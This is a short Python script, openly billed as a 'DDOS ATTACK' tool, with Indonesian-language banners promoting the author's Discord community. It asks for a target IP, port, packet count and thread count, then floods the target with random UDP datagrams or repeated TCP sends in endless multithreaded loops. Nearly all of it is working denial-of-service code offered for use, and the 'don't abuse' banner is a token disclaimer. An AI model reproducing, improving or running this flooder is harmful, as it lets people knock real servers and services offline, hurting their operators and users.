#!/usr/bin/env python3
import random
import socket
import threading

print       (" - - > DDOS ATTACK !! DDOS ATTACK !! < - - ")
print       (" - - > DONT ABUSE THIS TOOLS !!!! < - - ")
print       (" - - > MY DISCORD? LYNDONWEIRDLY#9090 <- - ")                                   
print       (" - - > JIKA BUTUH BANTUAN LEBIH LANJUT BISA PM DISCORD SAYA < - - ")
print       (" - - > JOIN COMMUNITY LINK DIBAWAH <- - ")
print       (" - - > https://discord.gg/eUz99buFh7 < - - ")
print       (" - - > BUAT YANG MAU BELAJAR LEBIH, JOIN SKUY < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" (y/n):"))
times = int(input(" Paket :"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" LYNDON ATTACK ")
		except:
			print("[!] SERVER HAS BEEN DOWN")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" LYNDON ATTACK ")
		except:
			s.close()
			print("[*] SERVER HAS BEEN DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
